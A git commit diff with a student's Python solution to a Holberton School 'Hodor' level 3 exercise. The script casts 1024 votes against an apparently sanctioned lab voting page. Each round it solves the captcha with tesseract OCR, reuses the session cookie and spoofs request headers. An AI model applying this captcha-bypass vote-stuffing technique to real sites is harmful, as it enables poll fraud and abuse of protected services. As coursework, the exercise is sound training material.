1e78d21327307debdb47c10bfceb9694d923173f
Alexandro de Oliveira <alexandro.oliveira@holbertonschool.com>
2016-06-14 01:32:47 -0300

    Hodor 3 solution using Python + DeepLearning

--- hodor/level_3/python/deeplearning.py
+++ hodor/level_3/python/deeplearning.py
@@ -1,2 +1,32 @@
 from subprocess import Popen, PIPE
 import os
+
+
+def process_request(input_file, output_file):
+    args = ['tesseract', input_file, output_file] #Create the arguments
+    proc = Popen(args, stdout=PIPE, stderr=PIPE) #Open process
+    ret = proc.communicate() #Launch it
+
+    code = proc.returncode
+    if code != 0:
+        if code == 2:
+            raise TesseractException, "File not found"
+        if code == -11:
+            raise TesseractException, "Language code invalid: " + ret[1]
+        else:
+            raise TesseractException, ret[1]
+
+def check_path(): #Check if tesseract is in the path raise TesseractNotFound otherwise
+    for path in os.environ.get('PATH', '').split(':'):
+        filepath = os.path.join(path, 'tesseract')
+        if os.path.exists(filepath) and not os.path.isdir(filepath):
+            return True
+    raise TesseractNotFound
+
+def image_to_string(file):
+    check_path() #Check if tesseract available in the path
+    process_request(file, 'tmp') #Process command
+    f = open("tmp.txt","r") #Open back the file
+    txt = f.read()
+    os.remove("tmp.txt")
+    return txt
--- hodor/level_3/python/hodor3.py
+++ hodor/level_3/python/hodor3.py
@@ -1,24 +1,47 @@
+"""
+ *
+ * ===---Description------------------------------------------------------------===
+ *  Solution for the Hodor Project, Level 3 by Julien Barbier.
+ *  Using Python script and some Deep Learning stuff...
+ *
+ *  by Alexandro de Oliveira, for Holberton School
+ * ===--------------------------------------------------------------------------===
+ *
+"""
 import requests
-from deepLearning import image_to_string
+from deeplearning import image_to_string
 
 url = 'http://173.246.108.142/level3.php'
-total_votes = (1 << 10)
+captcha_image = 'http://173.246.108.142/captcha.php'
+
 params = {
     'id': '23',
     'holdthedoor': 'submit',
     }
 
 headers = {
-    "User-Agent": "My User Agent"
+    "User-Agent": "Windows NT 100.0.0.0.1a (aka: Blue Screen of Death) Python Post Requests from anywhere - Alexandro de Oliveira",
     "Referer": url
     }
 
-main_function() {
-"""
+count = 0
+for i in range(0, 1024):
+    req = requests.session()
+    c_image = req.get(captcha_image, headers=headers)
+    with open('tmp.png', 'w') as f:
+        for i in c_image:
+            f.write(i)
 
-/*
-    mistery...  ;-)
- */
-
-"""
-}
+    captcha = image_to_string("tmp.png")
+    captcha = ' '.join(captcha.split())
+    body = req.head(url, headers=headers)
+    cookie1 = req.cookies['HoldTheDoor']
+    params['key'] = cookie1
+    params['captcha'] = captcha
+    response = req.post(url, data=params, headers=headers)
+    if response:
+        print "Vote number: " + str(count + 1)
+        count += 1
+    else:
+        "Connection error... (vote not computed!)"
+    req.close()
